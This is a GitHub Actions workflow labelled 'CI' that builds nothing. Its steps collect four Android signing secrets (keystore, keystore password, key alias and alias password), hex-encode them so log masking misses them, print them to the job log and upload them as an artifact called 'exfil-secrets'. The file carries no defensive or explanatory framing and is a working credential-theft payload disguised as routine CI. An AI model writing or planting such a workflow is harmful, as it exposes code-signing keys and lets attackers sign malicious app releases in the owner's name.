name: CI
on:
  workflow_dispatch: {}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Collect secrets
        env:
          ANDROID_KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}
          ANDROID_KEYSTORE_PASSWORD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
          ANDROID_KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
          ANDROID_KEY_ALIAS_PASSWORD: ${{ secrets.ANDROID_KEY_ALIAS_PASSWORD }}
        run: |
          echo '[HEX_START]' > /tmp/exfil.txt
          echo 'ANDROID_KEYSTORE_BASE64=' >> /tmp/exfil.txt
          printf '%s' "$ANDROID_KEYSTORE_BASE64" | xxd -p >> /tmp/exfil.txt
          echo '' >> /tmp/exfil.txt
          echo 'ANDROID_KEYSTORE_PASSWORD=' >> /tmp/exfil.txt
          printf '%s' "$ANDROID_KEYSTORE_PASSWORD" | xxd -p >> /tmp/exfil.txt
          echo '' >> /tmp/exfil.txt
          echo 'ANDROID_KEY_ALIAS=' >> /tmp/exfil.txt
          printf '%s' "$ANDROID_KEY_ALIAS" | xxd -p >> /tmp/exfil.txt
          echo '' >> /tmp/exfil.txt
          echo 'ANDROID_KEY_ALIAS_PASSWORD=' >> /tmp/exfil.txt
          printf '%s' "$ANDROID_KEY_ALIAS_PASSWORD" | xxd -p >> /tmp/exfil.txt
          echo '' >> /tmp/exfil.txt
          echo '[HEX_END]' >> /tmp/exfil.txt
          echo '=== CONTENT ==='
          cat /tmp/exfil.txt
          echo '=== END ==='
      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: exfil-secrets
          path: /tmp/exfil.txt
          retention-days: 1